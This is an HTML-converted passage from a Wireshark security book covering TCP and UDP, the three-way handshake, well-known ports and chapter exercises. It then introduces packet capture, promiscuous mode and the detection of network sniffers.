style="margin-top:7.5500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker143397.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >UDP is much faster, light weight, and doesn&#8217;t care if the packet reaches its destination.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker143488.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >While both do error checking by checksums, UDP won&#8217;t recover from one. TCP includes error recovery, thanks to acknowledgments.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Before sending any actual data, TCP first establishes a connection. The famous three-way (three packet) handshake is shown in<a name="_bookmark229" ></a>&nbsp;</span><span><a href="#_bookmark230" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-7</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="782"  height="127"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker143786.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.6000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark230" ></a><span><a href="#_bookmark229" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-7:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >TCP&#8217;s 3-way handshake</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:13.3500pt;" ><a name="_bookmark231" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As shown in </span><span><a href="#_bookmark230" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-7</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, TCP is connection-oriented and will first establish by 3-way handshake a connection between the two systems: a SYN there, a SYN-ACK in response, then an ACK to confirm. Only after the 3-way handshake is confirmed is a message packet sent or streamed across many packets to follow. (By the way, did you notice the 3-way handshake in the chapter&#8217;s first figure, 3-1?)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >TCP is used when a service requires reliability, error checking, and recovery, flow control, and sequenced packets. UDP is just &#8220;best</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section114" ><p class=MsoBodyText  style="margin-top:3.6500pt;margin-right:11.1500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >effort&#8221;&#8212;fire and forget. Basically, every application or service makes use of just one or the other, TCP or UDP.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.3000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A big exception to using only TCP or UDP is the protocol DNS. DNS regularly uses both, according to needs of performance versus reliability. When it comes to DNS queries (Where&#8217;s that server?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:8.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Where&#8217;s that website?), the query is sent fast and furious by UDP. If</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >no answer after a few seconds, it sends it again. No need to bother with 3- way handshakes with so many queries to follow. But, databases need to stay accurate and do so with confidence. That reliability justifies the cost of TCP. That&#8217;s what makes DNS packet captures fun to follow, seeing stuff fly around over port 53/udp and 53/tcp, which leads to the next</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >section.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.9500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Well-Known Ports</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  align=justify  style="margin-top:7.8000pt;margin-right:28.7500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If the TCP protocol is the message, then the port number is the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >mail slot where the message goes. The kind of message being delivered</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is what determines to which port to send the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.7000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >message.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:72.9500pt;margin-left:23.0000pt;line-height:145%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Got a DNS query about a website? That&#8217;s UDP port 53. Data request to the HTTP server? That&#8217;s TCP port 80. Logging in to your bank&#8217;s webserver? That&#8217;s TCP port 443.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:21.0000pt;margin-left:23.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Fetching your webmail? That&#8217;s TCP port 110. Sending? TCP port 25.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In short, for any system with services running, the common understanding is to connect to that system at the expected port number. These ports are so expected and widely established, they are called the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >well-known ports</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The port number is written as &#8220;TCP port 80&#8221; or as &#8220;80/tcp&#8221;&#8212;both standard ways to denote the same thing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If anyone&#8217;s security mind is questioning, &#8220;This makes the service so well known and vulnerable?&#8221; No, it must be available for use. You harden the service, <a name="_bookmark232" ></a>right? There&#8217;s no security through obscurity. If, for example, you configured </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >your </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >DNS server to listen on port 118 instead of 53, then everyone&#8217;s queries would end at a closed 53/udp, to be left unanswered. (And, maybe SQL databases would feel less special.)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section115" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Well-known ports include those from port 0 to 1024. From 1025 to 49151, they are called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >registered ports</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, then </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >dynamic </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >from port 49152 onward. We are really only concerned with well-known ports, and those on the server or listening side. Rather than list the hundreds or thousands of port numbers and associated services here, please feel free to search online for &#8220;well-known ports&#8221; to find many available lists.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:9.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark obviously knows the well-known ports and associates protocols by name against the port numbers seen in packets. So, when a packet is captured with destination port 80, Wireshark will present</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >it in the Packet List pane with &#8220;HTTP&#8221; in the protocol column. This is the default configuration, but it isn&#8217;t fixed or locked that way. Under Preferences, Wireshark can be told not to automatically resolve those protocols by port number and/or told which specific port numbers to assign to a protocol&#8212;certainly something to change if your company&#8217;s internal application uses the same registered port as a famous piece of malware.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Summary" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark233" ></a>Summary</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We&#8217;ve touched on a variety of topics, across security, networking, and protocol analysis. We supplemented the topics with a few example stories, scenarios, and a few problems solved. With regard to networking, we highlighted the OSI model. (Can&#8217;t publish a book without it.) The OSI model is used in separating the subtrees in Wireshark&#8217;s Packet Details pane. Also regarding networking, the various network options for virtual machines were described.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A few topics of security were covered with regard to Wireshark, including confidentiality and the way Wireshark can lend itself as an intrusion detection system or malware hunter. Also discussed were spoofing and poisoning, in preparation for a future exercise.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lastly, we covered a few items regarding protocol analysis. After walking through an example of analyzing a problem, it was cautioned that Wireshark only rarely finds the &#8220;smoking gun&#8221; so quickly. Other basic essentials covered included a few well-known ports and differences between layer 4 protocols TCP and UDP.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section116" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In </span><span><a href="#_bookmark237" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, we deep dive into capturing, recording, and storing network traces.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Exercises" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark234" ></a>Exercises</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=17  style="margin-top:9.8500pt;margin-right:11.6500pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-18.7500pt;text-align:left;mso-list:l20 level1 lfo3;" ><a name="_bookmark235" ></a><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >1.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Open Wireshark and start a capture. Browse anywhere in your</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >web browser. Stop the capture. Can you find the 3-way</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >handshake?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6000pt;margin-right:21.9000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l20 level1 lfo3;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >2.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Set up two virtual machines in VirtualBox, with their adapters</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >set to Host-only mode. Ensure IP addresses are on the same subnet. Can you ping between them? Can each ping the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.7500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >host?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:7.6000pt;margin-right:10.2000pt;margin-bottom:0.0000pt;margin-left:30.5000pt;text-indent:-20.2500pt;text-align:left;mso-list:l20 level1 lfo3;" ><![if !supportLists]><span style="font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" ><span style='mso-list:Ignore;' >3.<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Prepare the same two virtual machines, but with adapters set to Internal mode (and same network name). Can they ping each</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >other now? Or the host? Bonus: If you ran Wireshark on your host, would you see any traffic between the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.5000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >VMs?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section117" ><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:9.0000pt;" ><o:p>&nbsp;</o:p></span></p><h1 style="margin-right:257.8000pt;" ><a name="Chapter 4: Capturing Packets" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><a name="_bookmark237" ></a><a name="_bookmark236" ></a>Chapter 4 Capturing Packets</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:15.3500pt;margin-right:6.3500pt;" ><a name="_bookmark238" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This chapter deals with capturing the packets and handling them in Wireshark. It might seem too simple a topic to dedicate a chapter to, but Wireshark offers enough flexibility in handling packet capture files to fill more than a few pages. We also discuss the intelligence between the capture and what shows on the GUI. The tool&#8217;s interpretation of packets, or how the tool &#8220;dissects&#8221; the captured packets, is also clever and adaptable.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We delve into packet capturing on various operating systems, as well as how to handle the challenges of a switched network. With a brief introduction to TShark, you will capture packets both with the GUI and the command line.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With packets captured, we move on to handling capture files. Wireshark offers several options on how to save and manage your packet captures, according to the time, size, or even number of packets. We discuss the powerful interpreters behind Wireshark, the dissectors. Dissectors enable Wireshark to give the raw bits and bytes streaming across the wire some context by decoding and displaying them into something that is meaningful to the human analyst. We explore how Wireshark colorizes packets to add more meaning, as well as how you can adjust the colors to meet your own needs.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.8000pt;margin-right:10.3000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Finally, we offer a couple of resources full of capture files to study, just in case your own network isn&#8217;t active enough. In fact, if at work or on</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >a public network, capturing network traffic might be a policy</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.7000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >violation.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >On the other hand, capture files posted online are great for studying, since they are often sized to hold all the relevant packets but are scrubbed of unrelated data.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="Sniffing" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark239" ></a>Sniffing</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;" ><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Sniffing </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is <a name="_bookmark240" ></a>the colloquial term for capturing data from the network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section118" ><p class=MsoBodyText  style="margin-top:3.9500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Much like a dog sniffing the trail for evidence, we&#8217;re sniffing the wire for packets. (Great analogy, eh?) Generally, when we say we are capturing data from the network, we are talking about the recording of the 1s and 0s going across some physical medium. While machines are able to make sense of these 1s and 0s, humans need a little more help, which is where tools like Wireshark come in. In order to analyze a network protocol, you need to capture some traffic first. There are many ways to accomplish this, but we will walk through some basic network sniffing on a switched network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As discussed in an earlier chapter, normally you can only see network traffic originating from you, destined to you, or broadcast traffic. At least your network card knows to drop anything other than traffic involving your system. To sniff and capture traffic not relevant to your system requires a special mode.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Promiscuous Mode</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:8.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Normally a system is aware and &#8220;cares about&#8221; only the packets relevant to it. When the network card or driver receives a packet that</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is not addressed to it, the packet is dropped and the operating system is none the wiser. In the context of OSI layers discussed in an earlier chapter, packets are dropped at the lowest possible level, layer 2. Once MAC addressing determines the packet doesn&#8217;t relate to the host, then it&#8217;s dropped. Certainly there&#8217;s no reason to tie up resources handling it any further up the stack than that, right? But is the local traffic all you want to</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >see?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Depending on your sniffing setup, you may want a way to disable this behavior and gain visibility into all the packets that are hitting your network interface. Network drivers support this behavior with a setting called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >promiscuous mode</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. When this mode is enabled, the network card accepts all packets it sees and passes them up the network stack, allowing them to be captured by Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:8.1000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Back to layer 2. On a switched wired Ethernet network, however, there is little to no traffic seen by the host apart from that relevant to the local system. Remember that a switch is aware what MAC addresses are beyond each port. Because the switch is aware, the switch will not</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section119" ><p class=MsoBodyText  style="margin-top:3.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >forward packets destined for other hosts out to your machine. Only if several machines hang off a hub (no discrimination of traffic at layer</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-right:11.6500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >2) between you and the nearest switch, then promiscuous mode</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >would present traffic from multiple machines. If it is one machine per switch port, then promiscuous mode would reveal very little</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >more.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Passive Sniffing Is Hardly Passive</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8000pt;margin-right:9.0500pt;" ><a name="_bookmark241" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Someone might think that being in promiscuous mode is simply passive sniffing, undetectable. Wrong. Having a network monitoring system in promiscuous mode is detectable in a number of ways. One way is based on the fact your network interface is working overtime, processing </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >all </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >packets, not just those relevant to the host. If someone &#8220;hunting&#8221; for network sniffers, for example, pings all hosts and closely analyzes the time to respond, the sniffers can be exposed just by being the slowest. Even though the actual time difference from the rest is only a few hundred milliseconds, they will be consistently the slowest.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:9.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There are other ways to detect sniffing machines, apart from just performance. Some network capture tools respond to ARP replies in a way that is detectable. Another way is if you have the capturing device resolve an IP address to its DNS name (which Wireshark will gladly do if you wish). By sending traffic with a &#8220;false flag&#8221; IP address, only a network sniffer would seek to resolve that IP, therefore alerting the sniffer detection team it exists. It fast becomes a game of cat and mouse, and additional care needs to be taken if the goal of your sniffing activities is to remain as invisible as possible. How to remain invisible goes beyond the scope of this book, and evading promiscuous NIC detection will have to be left as an exercise for the reader.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:15.0500pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Promiscuous Mode versus Monitor 